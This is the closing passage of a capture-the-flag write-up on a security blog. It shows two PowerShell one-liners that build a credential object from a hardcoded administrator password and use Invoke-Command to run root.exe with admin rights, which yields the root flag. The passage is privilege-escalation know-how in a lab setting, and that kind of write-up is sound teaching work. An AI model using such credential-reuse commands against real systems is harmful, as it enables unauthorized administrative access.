<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$username</span> <span class="o">=</span> <span class="s1">'administrator'</span>; <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'1234test'</span>; <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> -AsPlainText <span class="nv">$Password</span> -Force; <span class="nv">$cred</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$pass</span>; Invoke-Command -ComputerName localhost -credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> \users\administrator\desktop\root.exe <span class="o">}</span>

Are you trying to cheat me?</code></pre></figure>

<p>Sounded like I would need an extra step. I then remembered about the output of secret.exe that was giving me the current working directory, so I thought if that could be the problem. I changed the command to be in the same directory as root.exe:</p>

<p><b>Note: The .\ is important.</b></p>

<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$username</span> <span class="o">=</span> <span class="s1">'administrator'</span>; <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'1234test'</span>; <span class="nv">$pass</span> <span class="o">=</span> <span class="nb">ConvertTo-SecureString</span> -AsPlainText <span class="nv">$Password</span> -Force; <span class="nv">$cred</span> <span class="o">=</span> <span class="nb">New-Object </span>System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$pass</span>; Invoke-Command -ComputerName localhost -credential <span class="nv">$cred</span> -ScriptBlock <span class="o">{</span> <span class="nb">set-location</span> \users\administrator\desktop\; .\root.exe <span class="o">}</span></code></pre></figure>

<p>With this I got the root flag. The End.</p>

  </div>

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

    <!-- <h2 class="footer-heading">...and another security blog</h2> -->

    <div class="footer-col-wrapper">
	<!--
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li>...and another security blog</li>
          <li><a href="mailto:"></a></li>
        </ul>
      </div>
	-->

      <div class="footer-col footer-col-2">
        <ul class="social-media-list">
          

          
        </ul>
      </div>

      <div class="footer-col footer-col-3">
        <p>Adventures in the Infosec world.</p>
      </div>
    </div>

  </div>

</footer>


  </body>

</html>
